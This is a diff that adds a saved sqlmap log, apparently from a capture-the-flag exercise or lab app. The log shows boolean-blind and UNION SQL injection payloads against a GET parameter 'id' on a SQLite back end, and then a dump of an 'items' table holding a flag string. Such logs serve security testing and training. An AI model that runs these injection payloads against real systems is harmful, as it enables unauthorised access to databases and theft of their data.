@@ -1,0 +1,40 @@
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 4711=4711
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,107,122,98,113)||CHAR(112,105,121,115,119,81,109,113,87,122,119,110,74,80,120,76,89,65,79,83,70,97,87,105,85,67,122,120,73,73,86,112,90,119,88,78,87,121,86,114)||CHAR(113,112,113,113,113),NULL-- rqTn
+---
+back-end DBMS: SQLite
+<current>
+[1 table]
++-------+
+| items |
++-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 4711=4711
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,107,122,98,113)||CHAR(112,105,121,115,119,81,109,113,87,122,119,110,74,80,120,76,89,65,79,83,70,97,87,105,85,67,122,120,73,73,86,112,90,119,88,78,87,121,86,114)||CHAR(113,112,113,113,113),NULL-- rqTn
+---
+back-end DBMS: SQLite
+Database: <current>
+Table: items
+[2 entries]
++----+-------+-------------------+
+| id | name  | secret            |
++----+-------+-------------------+
+| 1  | alpha | flag{fapi_sql_ok} |
+| 2  | beta  | nothing           |
++----+-------+-------------------+
+
